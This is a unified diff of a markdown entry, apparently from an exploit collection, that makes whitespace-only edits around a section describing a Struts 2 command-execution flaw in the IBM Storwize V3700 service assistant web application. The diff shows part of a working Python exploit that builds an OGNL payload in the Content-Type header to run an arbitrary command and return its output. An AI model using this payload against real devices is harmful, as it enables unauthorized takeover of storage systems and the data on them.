@@ -13,7 +13,8 @@
 
 - **Vulnerability Name:** Command Execution Vulnerability exists in IBM storwize v3700 device system
 - **Vulnerability Description:** IBM storwize v3700 is the latest member of the IBM storwize disk system family. It provides efficient entry-level configuration and is designed to meet the needs of small and medium-sized enterprises. Storwize v3700 is designed to provide organizations with the ability to integrate and share data at a reasonable price, while providing advanced software functions that are usually more expensive systems.The device system is equipped with a service assistant web application by default. The web application uses the struts 2 component, and there is an arbitrary command execution vulnerability, so that the attacker can easily obtain the management authority of the device.
-- **exp:**
+- **exp:**  
+
 ```python
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
@@ -43,13 +44,11 @@ def exploit(url, cmd):
     payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
     payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
     payload += "(#ros.flush())}"
-
     try:
         headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
         page = requests.post(url, headers=headers, verify=False, stream=True).text
     except http.client.IncompleteRead as e:
         page = e.partial.decode('utf-8')
-
     print(page)
     return page
 
